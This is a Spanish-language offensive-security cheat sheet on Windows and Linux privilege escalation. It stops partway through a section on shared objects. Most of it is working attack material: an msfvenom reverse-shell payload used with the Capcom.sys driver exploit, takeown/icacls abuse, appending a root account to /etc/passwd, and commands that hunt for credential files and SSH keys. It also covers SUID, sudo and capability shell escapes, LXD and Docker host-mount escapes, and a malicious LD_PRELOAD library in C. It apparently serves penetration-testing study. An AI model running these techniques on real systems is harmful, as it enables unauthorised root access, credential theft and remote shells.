###### Búsqueda de registros de seguridad con wevtutil 

La utilidad `wevtutil` es una herramienta eficaz para administrar los registros de eventos de Windows. Permite consultarlos y recuperar información según criterios específicos. En este ejemplo, nos centraremos en consultar el registro de seguridad para encontrar eventos específicos relacionados con el usuario.

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Explicación:

- `wevtutil`: Esta es la utilidad de línea de comandos para la administración de eventos de Windows.
- `qe Security`: Esta opción específica que queremos consultar el registro de seguridad.
- `/rd:true`: Esta opción invierte el orden de eventos, mostrando primero los más recientes. Esto resulta útil para identificar rápidamente las actividades más recientes.
- `/f:text`: Esta opción específica el formato de la salida. En este caso, solicitamos la salida en texto plano.
- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los resultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.

###### Salida de ejemplo

El comando puede producir un resultado similar al siguiente:

```powershell
Process Command Line: net use T: \\dbs\backups /user:elliot Password123!
```

Interpretación de la salida

- La salida indica que se ejecutó un comando para establecer una conexión de red a `\\dbs\backups` utilizando el nombre de usuario (`elliot`) y la contraseña especificados (`Password123!`).
- Esta información puede ser crucial para el análisis de seguridad, ya que revela la actividad del usuario relacionada con los recursos compartidos de la red, lo que potencialmente podría indicar acceso no autorizado o uso indebido de credenciales.

##### Print Operators

El grupo **Print Opertaros** en Windows está destinado a usuarios que necesitan gestionar impresoras y trabajos de impresión. Los miembros de este grupo pueden realizar tareas como configurar impresoras, administrar colas de impresión y ejecutar funciones relacionadas con el servidor de impresión. Aunque estos permisos están enfocados en tareas de impresión, en determinadas circunstancias podrían ser explotados para escalar privilegios en un sistema Windows.

###### Escalada de Privilegios a través del Grupo de Operadores de Impresión y el Controlador Capcom.sys

El grupo **Print Operators** es un grupo con privilegios elevados en Windows que otorga a sus miembros permisos significativos, entre los que se incluyen:

- **SeLoadDriverPrivilege**: Permite a los miembros cargar y gestionar controladores del sistema.

- **Gestión de impresoras**: Capacidad para crear, compartir, administrar y eliminar impresoras conectadas a un controlador de dominio.

- **Acceso local a controladores de dominio**: Los miembros pueden iniciar sesión localmente en un controlador de dominio y apagarlo.

Estos privilegios permiten a los miembros del grupo cargar controladores del sistema, lo que puede ser explotado para realizar acciones con mayores privilegios en el sistema.

###### Uso de Capcom.sys para la Escalada de Privilegios

El controlador `Capcom.sys` es un controlador conocido que permite ejecutar código con privilegios de sistema. Este controlador puede ser utilizado para escalar privilegios en un entorno Windows. A continuación, se describe el proceso:

1. **Descargar el Controlador Capcom.sys**

    El controlador `Capcom.sys` puede descargarse desde el siguiente repositorio de GitHub:

    [Capcom-Rootkit - Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

    Además, se pueden encontrar herramientas útiles como `LoadDriver.exe` y `ExploitCapcom.exe` en el siguiente repositorio:

    [SeLoadDriverPrivilege - Josh Morrison](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)

2. **Crear un Ejecutable Malicioso**

    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, `rev.exe`) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.exe
    ```

3. **Cargar el Controlador Capcom.sys**

    - Utilizamos la herramienta `LoadDriver.exe` para cargar el controlador `Capcom.sys`. El comando a ejecutar es el siguiente:

    ```powershell
    .\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\Test\Capcom.sys
    ```

    - Si la ejecución es exitosa, el comando debería devolver:

    ```powershell
    NTSTATUS: 00000000, WinError: 0
    ```

    - Si no es así, verifique la ubicación de Capcom.sys y asegúrese de que está ejecutando `LoadDriver.exe` desde el directorio correcto.

4. **Ejecutar el Ejecutable Malicioso**

    - Una vez cargado el controlador, utilizamos `ExploitCapcom.exe` para ejecutar el ejecutable malicioso con privilegios elevados:
 
    ```powershell
    .\ExploitCapcom.exe C:\Temp\rev.exe
    ```
    - Este comando ejecutará el archivo `rev.exe` con privilegios de sistema, proporcionando al atacante un reverse shell.

##### SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege es un privilegio de Windows que permite a los usuarios tomar posesión de objetos, como archivos, carpetas  claves de registro, incluso sin permisos explícitos. Una vez toma la propiedad, el usuario puede modificar los permisos del objeto para obtener control total, eludiendo así las restricciones de acceso.

Podemos utilizar el comando `whoami /priv` para comprobar si el privilegio `SeTakeOwnershipPrivilege` esta habilitado.

Explotación del privilegio `SeTakeOwnershipPrivilege`.

Si un usuario tiene el privilegio `SeTakeOwnershipPrivilege`, puede tomar el control de objetos sensibles, como archivos del sistema o procesos críticos y modificar sus permisos para obtener acceso o ejecutar comandos arbitrarios. A continuación, se explica cómo abusar de este privilegio para escalar privilegios.

```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
```

Si el privilegio está deshabilitado, podemos habilitarlo usando este script [Enable-Privilege.ps1](https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1).

```powershell
PS C:\temp> Import-Module .\Enable-Privilege.ps1
PS C:\temp> .\EnableAllTokenPrivs.ps1
PS C:\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

###### Toma de propiedad de archivos o directorios

`SeTakeOwnershipPrivilege` permite cambiar la propiedad de un archivo o directorio, lo que permite modificar o acceder a archivos restringidos. Tras tomar posesión, puede modificar su Lista de Control de Acceso Discrecional (DACL) para obtener control total.

Pasos para explotar `SeTakeOwnershipPrivilege` en archivos:

1. **Tomar propiedad de un archivo o directorio**:

Utilizamos el comando `takeown` para tomar propiedad de un archivo o directorio.

```powershell
takeown /F <file_or_directory>
```

Ejemplo:

```powershell
takeown /F C:\Windows\System32\drivers\etc\hosts
```

Este comando cambia la propiedad del archivo especificado a la cuenta del usuario actual.

2. **Conceder control total sobre el archivo**:

Después de tomar propiedad, modificamos los permisos del archivo usando el comando `icacls` para otorgarnos propiedad total.

```powershell
icacls <file_or_folder> /grant /<username>:F
```

Ejemplo:

```powershell
icacls C:\Windows\System32\drivers\etc\hosts /grant /<username>:F
```

- `/grant` Otorga control total (F) sobre el archivo al usuario especificado.

3. **Modificar o acceder al archivo**:

Tras obtener control total, podemos editar, eliminar o acceder al archivo según sea necesario.
Por ejemplo, podemos modificar archivos confidenciales del sistema como `hosts`, o incluso reemplazar ejecutables del sistema por otros maliciosos para obtener privilegios de nivel de SYSTEM.

Algunos archivos locales de interés pueden incluir:

```powershell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

###### Toma de propiedad de las claves de registro

También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad y los permisos de claves de registro críticas, lo que permite aumentar los privilegios.

**Pasos para explotar claves de registro**:

1. **Tomar propiedad de una clave de registro**:

    Utilizamos `regedit` o `Powershell` para cambiar la propiedad de una clave de registro. Podemos asumir la propiedad de claves confidenciales, como las relacionadas con cuentas de usuarios, servicios o configuraciones de inicio.

    Ejemplo en Powershell:

    ```powershell
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<key>" -Value "<value>"
    ```

    Esto cambia la propiedad de la clave, lo que permite modificar la configuración de inicio u otras configuraciones críticas.

2. **Modificar permisos**:

    Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.

###  10.2. <a name='linux-2'></a>Linux

####  10.2.1. <a name='enumeración-2'></a>Enumeración

##### Sistema

```bash
hostname
hostname -I
uname -a
w
lastlog
cat /etc/issue
cat /etc/os-release
cat /proc/version
cat /etc/shells
sudo -V
ps aux
df -h
mount
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
lscpu
lsblk
lsmod
/sbin/modinfo libata
```

##### Red

```bash
ip a
ifconfig
route
arp -a
ip route
ip neigh
ss -anp
netstat -net
netstat -ano
cat /etc/hosts
cat /etc/iptables/rules.v4
```

##### Usuarios y Grupos

```bash
whoami
id
env
history
cat .bashrc
cat /etc/passwd
cat /etc/passwd | grep "sh$"
grep "sh$" /etc/passwd | awk '{print $1}' FS=":"
cat /etc/shadow
cat /etc/group
getent group sudo
sudo -l
```

###### Algoritmos más utilizados

| Algoritmo | Hash |
| --------- | ---- |
| Salted MD5 | $1$... |
| SHA-256 | $5$... |
| SHA-512 | $6$... |
| BCrypt | $2a$... |
| Scrypt | $7$... |
| Argon2 | $argon2i$... |

##### Tareas Cron

```bash
crontab -l
sudo crontab -l
cat /var/log/syslog
ls -lah /etc/cron*
```

##### Capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

##### Archivos y Directorios

```bash
ls -l /tmp /var/tmp /dev/shm
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep student
find / -type d -name ".*" -ls 2>/dev/null
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

##### Búsqueda de credenciales

```bash
locate password | more
find / type f -name wp-config.php -exec grep -E "DB_PASSWORD|DB_USER|DB_NAME" {} \; 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -name password 2>/dev/null -exec ls -l {} \; 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
grep -rnw '/' -ie "PASSWORD" –color=always 2>/dev/null
```
##### Binarios y Paquetes instalados

```bash
dpkg -l
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
```

##### Procesos y Servicios

```bash
strace
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

##### Búsqueda de claves SSH

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

##### Archivos con permisos de escritura

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/.backups/script.sh
```
##### Abusando de Permisos inseguros

Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregamos una línea a `/etc/passwd` usando el formato apropiado:

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su - root2
```

##### Automatización

- [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20230108)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)


####  10.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios

> Referencias: https://gtfobins.github.io/

##### SUID

**Set User ID (SUID)** es un permiso especial en sistemas Unix/Linux. Cuando un archivo tiene el bit SUID establecido, permite que se ejecute con los privilegios de su propietario, independientemente del usuario que lo ejecute. Se suele utilizar para otorgar a usuarios normales permisos elevados temporales para ejecutar tareas específicas.

![SUID](./img/suid.png)

Indicado por `rws` para el permiso del propietario. Cuando el bit SUID (Set User ID) está activado (representado por una `s` en lugar de una `x` en el permiso de ejecución), cualquier usuario que ejecute este archivo lo hará con los permisos del propietario del archivo. Esto se utiliza comúnmente cuando un archivo es propiedad de root, pero permite que usuarios regulares lo ejecuten con privilegios de superusuario.

Los siguientes tres caracteres (`rws`) representan los permisos para el grupo propietario del archivo. Al igual que con los permisos del propietario, se otorgan o deniegan los permisos de lectura (`r`), escritura (`w`) y ejecución (`x`) para el grupo. Cuando el bit GUID (Set Group ID) está activado, el bit de ejecución (`x`) para el grupo se reemplaza por una `s`, lo que indica que el archivo se ejecutará con los privilegios del grupo propietario.

El GUID es similar al SUID, pero se aplica al grupo. Permite que cualquier usuario que ejecute el archivo lo haga con los permisos del grupo propietario. En este ejemplo, el permiso del grupo incluye una `s`, lo que muestra que el bit GUID está activado.

###### Cómo identificar archivos SUID 

Los archivos SUID se pueden identificar buscando archivos con el bit `s` en el campo de permiso de ejecución del propietario. 

```bash
find / -perm -4000 2>/dev/null
```

Ejemplo:

```bash
-rwsr-xr-x 1 root root /usr/bin/passwd
```

En este ejemplo:

- `rws`: Indica que el bit SUID está establecido.
- El propietario es `root`, lo que significa que cualquier usuario que ejecute este archivo lo hace con privilegios de `root`.

###### Cómo explotar binarios SUID para escalar privilegios. 

Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFOBins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.

[GTFOBins SUID](https://gtfobins.github.io/#+suid)

Por ejemplo, si el bit SUID está habilitado en un binario como Python, es posible explotarlo para escalar privilegios en el sistema. A continuación, se describe un caso práctico:

**Verificar si Python tiene el bit SUID activado**

Para comprobar si Python tiene el bit SUID configurado, ejecuta el siguiente comando:

```bash
ls -l /usr/bin/python
```

Si el bit SUID está activado, verás una salida similar a esta:

```bash
-rwsr-xr-x 1 root root /usr/bin/python
```

La `s` en los permisos del propietario (rws) indica que el bit SUID está habilitado.

**Explotar Python para escalar privilegios**

Si Python tiene el bit SUID activado, podemos ejecutar una línea de código para obtener una shell con privilegios de root:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-i")'
```

Este comando utiliza Python para lanzar una shell interactiva (`/bin/bash`) con los permisos del propietario del archivo, en este caso, `root`.

##### Sudo

Los privilegios de sudo pueden ser asignados a una cuenta, permitiendo que dicha cuenta ejecute comandos específicos en el contexto de root (u otro usuario) sin necesidad de cambiar de usuario o otorgar privilegios excesivos. Cuando se ejecuta el comando sudo, el sistema verifica si el usuario que lo ejecuta tiene los permisos adecuados, según la configuración definida en el archivo /etc/sudoers.

Al acceder a un sistema, siempre es recomendable verificar si el usuario actual tiene privilegios de sudo. Esto se puede hacer ejecutando el comando:

```bash
sudo -l
```

Este comando lista los comandos que el usuario puede ejecutar con sudo. En algunos casos, es posible que se requiera la contraseña del usuario para mostrar esta información. Sin embargo, si hay entradas en la configuración de sudo que incluyen la opción NOPASSWD, estos permisos se mostrarán sin necesidad de ingresar una contraseña.

[GTFOBins SUDO](https://gtfobins.github.io/#+sudo)

Ejemplo `tar`:

![Sudo - Tar](./img/tar-sudo.png)

##### Capabilities
Las **Capabilities** de Linux son una característica de seguridad del sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, haciéndolo más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos. 

A continuación se muestran algunas capacidades comunes disponibles en Linux: 

| Capability               | Descripción                                                                 |
|-------------------------|-----------------------------------------------------------------------------|
| **CAP_SYS_ADMIN**       | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. administrativas.                         |
| **CAP_CHOWN**           | Cambiar la propiedad de archivos.                                           |
| **CAP_DAC_OVERRIDE**    | Ignorar las verificaciones de permisos de lectura, escritura y ejecución de archivos. |
| **CAP_DAC_READ_SEARCH** | Ignorar las verificaciones de permisos de lectura de archivos.              |
| **CAP_FOWNER**          | Ignorar las verificaciones de permisos que normalmente requieren ser el propietario del archivo. |
| **CAP_NET_ADMIN**       | Realizar diversas operaciones relacionadas con la red, como configurar interfaces. |
| **CAP_NET_BIND_SERVICE**| Vincular (bind) a puertos de red por debajo del 1024.                        |
| **CAP_SYS_MODULE**      | Cargar y descargar módulos del kernel.                                      |
| **CAP_SYS_RAWIO**       | Realizar operaciones de entrada/salida (I/O) a bajo nivel.                  |
| **CAP_SYS_TIME**        | Modificar el reloj del sistema.                                             |

###### Asignar una Capability

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

###### Eliminar una Capability

```bash
sudo setcap cap_net_bind_service=-ep /usr/bin/vim.basic
```

A continuación se muestran algunos ejemplos de valores que podemos utilizar con el comando `setcap`, junto con una breve descripción de lo que hacen: 

| Valor | Descripción                                                                                   |
|-------|-----------------------------------------------------------------------------------------------|
| `=`   | Establece la capacidad especificada para el ejecutable, pero **no otorga ningún privilegio**. Útil para borrar capacidades previamente asignadas. |
| `+ep` | Otorga al ejecutable los privilegios **efectivos** y **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas por la capacidad, pero no otras. |
| `+ei` | Otorga al ejecutable privilegios **efectivos** e **heredables** para la capacidad especificada. Permite que el ejecutable y los procesos secundarios hereden la capacidad y realicen las acciones permitidas. |
| `+p`  | Otorga al ejecutable los privilegios **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas, pero evita que la capacidad sea heredada por procesos secundarios. |

En Linux, se pueden utilizar diversas capacidades (capabilities) para escalar los privilegios de un usuario hasta obtener acceso de root. Estas capacidades permiten a los procesos realizar acciones específicas que normalmente están restringidas a usuarios con privilegios elevados. A continuación, se describen algunas de las capacidades más relevantes para este propósito:

| Capability         | Descripción                                                                                   |
|-------------------|-----------------------------------------------------------------------------------------------|
| **CAP_SETUID**    | Permite que un proceso establezca su **ID de usuario efectivo**, lo que puede usarse para obtener los privilegios de otro usuario, incluido **root**. |
| **CAP_SETGID**    | Permite que un proceso establezca su **ID de grupo efectivo**, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo **root**. |
| **CAP_SYS_ADMIN** | Proporciona una amplia gama de privilegios administrativos, como modificar la configuración del sistema, montar y desmontar sistemas de archivos, y realizar otras acciones reservadas para el usuario **root**. |
| **CAP_DAC_OVERRIDE** | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos, lo que facilita el acceso a archivos restringidos. |

###### Enumerar binarios con capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

###### Explotación

Si hay capability configuradas en un binario, podemos usar esta capability para escalar privilegios.
Por ejemplo, si se establece la capability `CAP_SETUID`, esto se puede usar como una puerta trasera para mantener el acceso privilegiado manipulando su propio UID de proceso.

```bash
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> Referencias: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)

##### Tareas Cron
Los trabajos Cron son tareas programadas en sistemas Unix/Linux que se ejecutan automáticamente en intervalos específicos. Sin embargo, si no están configurados correctamente, pueden convertirse en un vector de ataque para escalar privilegios o ejecutar código malicioso. A continuación, se describen técnicas comunes para explotar vulnerabilidades en trabajos Cron:

![Tareas Cron](/img/cron.png)

Podemos verificar si una tarea cron está activa usando [Pspy](https://github.com/DominicBreuker/pspy), una utilidad de línea de comandos que nos permite observar los procesos en ejecución sin necesidad de acceso root. Esta herramienta nos permite monitorear los comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando:

```bash
./pspy64
``` 

**Identificación de trabajos cron**

Para ver trabajos cron específicos del usuario, podemos utilizar el comando:

```bash
crontab -l
```

Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en `/etc/crontab`, `/etc/cron.d/`, y `/var/spool/cron/crontabs/`.

###### Explotación de tareas cron

###  10.3. <a name='técnicas-de-explotación-de-trabajos-cron'></a>Técnicas de explotación de trabajos Cron

| Técnica                          | Descripción                                                                                   |
|----------------------------------|-----------------------------------------------------------------------------------------------|
| **Modificación de scripts**       | Si un script ejecutado por Cron tiene permisos de escritura globales, un atacante puede modificarlo para ejecutar comandos arbitrarios. |
| **Creación de scripts maliciosos** | Si Cron ejecuta un script específico, un atacante puede crear un script con el mismo nombre y colocarlo en un directorio que tenga prioridad en el `PATH`. |
| **Condiciones de carrera**        | Un atacante puede reemplazar rápidamente un script mientras Cron lo está ejecutando, aprovechando ventanas de tiempo críticas. |
| **Manipulación de variables de entorno** | Si Cron depende de variables de entorno no configuradas o no depuradas, un atacante puede manipularlas para alterar el comportamiento del comando ejecutado. |
| **Manipulación de rutas (PATH)**  | Si Cron usa comandos sin rutas absolutas, un atacante puede modificar la variable `PATH` para ejecutar versiones maliciosas de esos comandos. |
| **Ataques de enlace simbólico**   | Si Cron escribe la salida en un archivo, un atacante puede crear un enlace simbólico desde ese archivo a un archivo confidencial o a un script controlado por él. |
| **Uso de características del shell** | Si Cron usa un shell como `bash`, un atacante puede explotar características como la sustitución de comandos para ejecutar código arbitrario. |
| **Inserción en el Crontab**       | Si un usuario con privilegios permite que otros agreguen entradas al Crontab (por ejemplo, con `crontab -e`), un atacante puede insertar comandos maliciosos. |
| **Permisos de usuario insuficientes** | Si Cron se ejecuta con privilegios elevados y no restringe adecuadamente los scripts o binarios que ejecuta, un atacante puede modificar o crear archivos para escalar privilegios. |
| **Manipulación de la salida**     | Si la salida de Cron se guarda en un archivo con permisos de escritura globales, un atacante puede manipular o reemplazar este archivo para ejecutar código arbitrario. |
| **Ataques de sincronización**    | Conociendo el momento exacto en que se ejecuta un trabajo Cron, un atacante puede lanzar ataques sincronizados, como la manipulación de scripts justo antes de su ejecución. |
| **Inclusión de archivos locales (LFI)** | Si Cron incluye archivos sin validar adecuadamente la entrada, un atacante puede aprovechar esto para incluir archivos maliciosos que se ejecuten durante la tarea programada. |

##### LXC / LXD

###### Linux Containers (LXC)

**Linux Containers (LXC)** es una técnica de virtualización a nivel de sistema operativo que permite que varios sistemas Linux se ejecuten de forma aislada en un único host, al poseer sus propios procesos, pero compartir el kernel del sistema host. LXC es muy popular gracias a su facilidad de uso y se ha convertido en un componente esencial de la seguridad informática. 

###### Linux Daemon (LXD)

**Linux Daemon (LXD)** es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistema. Antes de poder usar este servicio para escalar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando: 

```
elliot@debian:~$ id

uid=1000(elliot) gid=1000(elliot) groups=1000(container-user),116(lxd)
```

###### Explotación

A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como `/etc/shadow`.

1. **Descargar y transferir la imagen Alpine**:

    - Descarga la imagen mínima de Alpine Linux desde `https://github.com/saghul/lxd-alpine-builder.git`

        ```bash
        git clone https://github.com/saghul/lxd-alpine-builder.git
        ```
    - Transferir el archivo `alpine-v3.3-x86_64-20160114_2308.tar.gz`.

2. **Inicializar LXD**:

    - Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).

3. **Importar la imagen local**:

    - Usamos el siguiente comando para importar la imagen:

        ```bash
        lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine
        ```

    - Verificmos la importación con:
    
        ```bash
        lxc image list
        ```
4. **Crear un contenedor privilegiado**:

    - Iniciamos un contenedor con privilegios elevados usando:

        ```bash
        lxc init alpine privesc -c security.privileged=true
        ```
        
        - `alpine`: Nombre de la imagen.
        - `privesc`: Nombre del contenedor.
        - `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.

5. **Montar el sistema de archivos del host**:
    - Montamos todo el sistema de archivos del host (`/`) en el contenedor:

        ```bash
        lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
        ```

        - `source=/`: Ruta del sistema de archivos del host.
        - `path=/mnt/root`: Ruta de montaje en el contenedor.
        - `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.

6. **Iniciar el contenedor**:
    - Iniciamos el contenedor con:

        ```bash
        lxc start privesc
        ```

    - Verificamos el estado del contenedor con:

        ```bash
        lxc list
        ```
7. **Ejecutar comandos dentro del contenedor**:
    - Accedemos a una shell dentro del contenedor:

        ```bash
        lxc exec privesc /bin/sh
        ```
8. **Modificar el sistema de archivos del host**:

    - Dentro del contenedor, navegamos a `/mnt/root` para acceder al sistema de archivos del host.

    - Editamos archivos críticos como `/mnt/root/etc/shadow` para cambiar la contraseña de `root`.

    - Esto permite iniciar sesión como `root` en el host.
    - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`.

##### Escalación de Privilegios - Docker

Si somos miembros del grupo `docker`, podemos escalar nuestros privilegios a `root`.

La idea es montar el directorio `/` de la máquina host en nuestro contenedor. Una vez montado el directorio, tendremos acceso a `root` en nuestro contenedor y podremos manipular cualquier archivo del sistema de archivos del host a través del contenedor.

```bash
docker run -v /:/mnt -it alpine
```
Montamos el directorio `/` (raíz) del host en el directorio `/mnt` del contenedor y con la opción `-it` le indicamos que queremos ejecutar una termina interactiva y que la imágen base será `alpine`.

En caso de que la máquina víctima no tenga acceso a internet, podemos hacer lo siguiente:

- `docker pull alpine`: Descargamos la imagen de Alpine en nuestra máquina atacante.
- `docker save -o alpine.tar alpine`: Guardamos la imagen de Alpine en un archivo tar y la transferimos a la máquina víctima.
- `docker load -i alpine.tar`: Cargamos la imagen desde el archivo tar.
- `docker image ls`: Comprobamos que se cargo correctamente la imagen.
- `docker run -v /:/mnt -it alpine`: Creamos el contenedor.

##### LD_PRELOAD Shared Library

Para realizar este ataque, se requiere:

- Un usuario con privilegios sudo que pueda ejecutar al menos un comando (no importa cuál).
- El uso de la variable de entorno `LD_PRELOAD` para lograr persistencia al invocar sudo.

###### Sobre las bibliotecas compartidas

Son archivos de código precompilado que múltiples programas pueden utilizar simultáneamente. Su propósito principal es:

- Modularizar el código, evitando duplicaciones.
- Permitir que distintas aplicaciones compartan funciones y recursos de manera eficiente.

###### ¿Qué es LD_PRELOAD?

Es una variable de entorno en sistemas Unix/Linux que fuerza la carga de una biblioteca compartida específica antes que las demás al ejecutar un programa. Esto permite:

- Sobrescribir funciones de bibliotecas estándar (útil para debugging o, en este caso, para explotación).

- Modificar el comportamiento de programas sin recompilarlos.

###### Ejemplo

```bash
elliot@debian:~$ sudo -l

Matching Defaults entries for daniel.carter on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on debian:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

En el ejemplo anterior, observamos que:

- El usuario elliot tiene permisos para ejecutar el comando apache2 como root sin necesidad de ingresar la contraseña.

- La configuración de sudo incluye `env_keep+=LD_PRELOAD`, lo que significa que las variables de entorno (incluyendo `LD_PRELOAD`) se conservan al ejecutar comandos con sudo.

###### Pasos para el Ataque

1. **Creación de una Biblioteca Compartida Maliciosa**:

    - Desarrollaremos una biblioteca compartida diseñada para sobrescribir funciones clave (ej: libc).

2. **Inyección mediante `LD_PRELOAD`**:

    - Usaremos la variable LD_PRELOAD para cargar nuestra biblioteca maliciosa antes que las bibliotecas del sistema.

3. **Ejecución del Comando Privilegiado**:

    - Al correr sudo `/usr/sbin/apache2 restart`, el sistema cargará nuestra biblioteca maliciosa debido a `LD_PRELOAD`, permitiéndonos ejecutar código arbitrario con privilegios de root.

###### Creación de bibliotecas compartidas maliciosas 

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compilamos el código:

```bash
gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
```

Ejecutamos el código:

```bash
elliot@debian:~$ $: sudo LD_PRELOAD=/locatio_of_malicious_library/malicious.so /usr/bin/ping
root@@debian #: whoami
root
```

##### Shared Object

###### ¿Qué es un Shared Object (.so)?

Un `shared object` (objeto compartido) es un archivo binario compilado que contiene código y datos reutilizables por múltiples programas. En sistemas **Unix-like** (como Linux), estos archivos tienen la extensión **.so** y permiten:

- **Reducir redundancia**: Varios programas pueden cargar la misma biblioteca en memoria.
- **Ahorrar recursos**: Evita duplicar código en cada ejecutable.

###### Explotación mediante Manipulación de Bibliotecas

Algunos binarios utilizan bibliotecas personalizadas (no estándar). Si tenemos acceso de escritura sobre estas, podemos escalar privilegios.

Ejemplo Práctico

1. **Identificar un binario con SUID (ejecución como propietario, normalmente root)**:

    ```bash
    elliot@debian:~$ ls -la custom_binary
    -rwsr-xr-x 1 root root 16728 Jan 12 11:05 custom_binary
    ```

2. **Verificar las bibliotecas que usa el binario (comando `ldd`)**:

    ```bash
    elliot@debian:~$ ldd custom_binary
    libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f0c13112000)
    ```

    Se observa que usa una biblioteca no estándar: `libshared.so`.

